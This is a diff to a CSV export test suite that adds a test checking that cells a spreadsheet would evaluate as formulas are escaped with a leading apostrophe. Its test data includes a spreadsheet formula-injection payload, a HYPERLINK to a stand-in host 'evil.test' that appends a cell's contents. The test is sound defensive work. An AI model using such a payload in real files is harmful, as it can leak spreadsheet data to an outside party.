@@ -478,6 +478,27 @@ describe("resultsToCsv", () => {
         expect(parseCsv(resultsToCsv([{ a: null, b: "null" }]))).toEqual([["a", "b"], ["", "null"]]);
     });
 
+    it("writes a cell a spreadsheet would run as a formula as text, as the CMS export does", () => {
+        // Excel and Sheets strip the CSV quoting and then evaluate a cell that
+        // starts with = + - @ (or a tab or carriage return).
+        const rows = [
+            { name: "=HYPERLINK(\"https://evil.test/?\"&A1,\"click\")" },
+            { name: "@SUM(A1)" },
+            { name: "+1+1" },
+            { name: "-12.5" },
+            { name: "Alice" }
+        ];
+        expect(parseCsv(resultsToCsv(rows)).map(record => record[0])).toEqual([
+            "name",
+            "'=HYPERLINK(\"https://evil.test/?\"&A1,\"click\")",
+            "'@SUM(A1)",
+            "'+1+1",
+            "-12.5",
+            "Alice"
+        ]);
+        expect(toCsv(["=cmd"], [{ "=cmd": -3 }])).toBe("'=cmd\r\n-3\r\n");
+    });
+
     it("quotes a column name that needs it", () => {
         expect(parseCsv(resultsToCsv([{ "a,b": "1", "say \"x\"": "2" }]))[0]).toEqual(["a,b", "say \"x\""]);
     });
